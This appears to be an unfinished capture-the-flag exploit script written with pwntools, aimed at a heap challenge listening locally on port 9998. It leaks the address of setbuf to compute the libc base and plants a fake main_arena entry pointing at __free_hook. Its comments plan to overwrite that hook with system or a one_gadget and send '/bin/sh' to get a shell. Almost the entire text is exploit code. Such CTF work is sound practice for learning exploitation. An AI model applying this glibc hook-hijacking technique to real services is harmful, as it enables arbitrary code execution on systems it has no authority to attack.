from pwn import *

r = remote("0.0.0.0", 9998)

# l = ELF("./libc-2.31.so")
l = ELF("/usr/lib/libc-2.31.so")

setbuf = l.symbols['setbuf']

free_hook = l.symbols['__free_hook']

# TODO: replace with remote libc
main_arena_ptr_offset = 0x1c1250

info = r.recvuntil("\n")

libc_setbuf = int(info.split(b":")[1][2:-1],16)

libc_base = libc_setbuf - setbuf

write_addr = libc_base + main_arena_ptr_offset

fake_main_arena = b"\x00"*24 + p64(libc_base + free_hook)

system = l.symbols["system"]
exec_addr = system + libc_base

# r.sendline(p64(exec_addr))
r.sendline(fake_main_arena)

r.recvuntil("write?:")

# r.sendline(p64(write_addr - 0x20))
r.sendline(p64(write_addr))

pause()
pause()
pause()

#r.sendline("/bin/sh")


# Get address in main_arena that is dereferenced when looking
# for next chunk in fastbin.
# write buf addr to this address w/ buf contents containing free_hook
# at correct offset.
# For 2nd message pass one_gadget, which will be written to free_hook.
